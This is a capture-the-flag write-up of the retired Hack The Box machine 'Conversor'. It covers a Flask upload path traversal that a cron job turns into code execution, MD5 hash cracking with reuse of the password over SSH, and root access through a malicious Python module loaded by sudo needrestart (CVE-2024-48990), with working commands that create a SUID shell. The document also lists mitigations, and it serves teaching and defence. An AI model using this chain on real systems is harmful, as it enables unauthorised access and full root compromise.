---
machine: Conversor
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, flask, path-traversal, cron, sqlite, needrestart]
---

# Conversor — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A Flask application accepts XML and XSLT uploads. The filename is passed to `os.path.join` without `secure_filename`, so an absolute name writes outside the upload directory. A cron runs every `.py` in the scripts directory and gives RCE. The SQLite database holds MD5 hashes; the password is reused over SSH and `needrestart` leads to root.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,80 <IP>
```

- OpenSSH and Apache 2.4.52.
- `conversor.htb` redirects to `/login`.
- The application is Flask with registration and sessions.

## Enumeration

- Registration creates an account.
- The panel exposes `/convert` with `xml_file` and `xslt_file`.
- Files are saved to disk before parsing; invalid XML reveals the saved path.

## Foothold

The code calls `os.path.join(UPLOAD_DIR, filename)`. In Python, an absolute second argument discards the first. The multipart `filename` points to `/var/www/conversor.htb/scripts/p0c.py` and writes a Python script.

```python
files = {
    "xml_file": ("/var/www/conversor.htb/scripts/p0c.py", open("payload.py", "rb")),
    "xslt_file": ("stub.xslt", open("stub.xslt", "rb")),
}
```

A cron runs every `.py` in that directory once a minute. The script executes as `www-data`.

```bash
* * * * * for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

## Lateral movement

`instance/users.db` contains unsalted MD5 hashes. `fismathack`'s hash is cracked with `hashcat -m 0` and the password works over SSH.

```bash
sqlite3 instance/users.db 'select username,password from users;'
hashcat -m 0 fismathack.hash /usr/share/wordlists/rockyou.txt
ssh fismathack@conversor.htb
```

## Privilege escalation

`sudo -l` allows passwordless `needrestart`. The tool evaluates its configuration as Perl and also loads Python modules from the environment. A malicious `importlib.py` is placed in `/tmp`, a process is started with `PYTHONPATH`, and `sudo needrestart` imports the module with root privileges.

```bash
mkdir /tmp/x
printf 'import os\nos.system("cp /bin/bash /tmp/rb; chmod +s /tmp/rb")\n' > /tmp/x/importlib.py
PYTHONPATH=/tmp/x python3 -c 'import time; time.sleep(3600)' &
sudo needrestart
/tmp/rb -p
```

## Evidence

- Upload request with an absolute filename.
- File written under `scripts/` and executed by cron.
- Cracked MD5 hash and SSH access.
- `sudo` rule, Python module and SUID binary.
- Redacted flag.

## Lessons learned

- `os.path.join` is not a security boundary.
- A cron that runs an entire directory turns any write into RCE.
- Unsalted MD5 hashes fall to a wordlist.

## Mitigations and detection

- Use `secure_filename` and verify the final path stays under the upload directory.
- Do not execute scripts from a directory writable by the web service.
- Replace MD5 with Argon2 or bcrypt and never reuse passwords.
- Restrict `needrestart` in `sudo` and audit configuration changes.

## References

- <https://www.hackthebox.com/machines/Conversor>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-48990>
- <https://docs.python.org/3/library/os.path.html#os.path.join>
- <https://attack.mitre.org/techniques/T1059/006/>
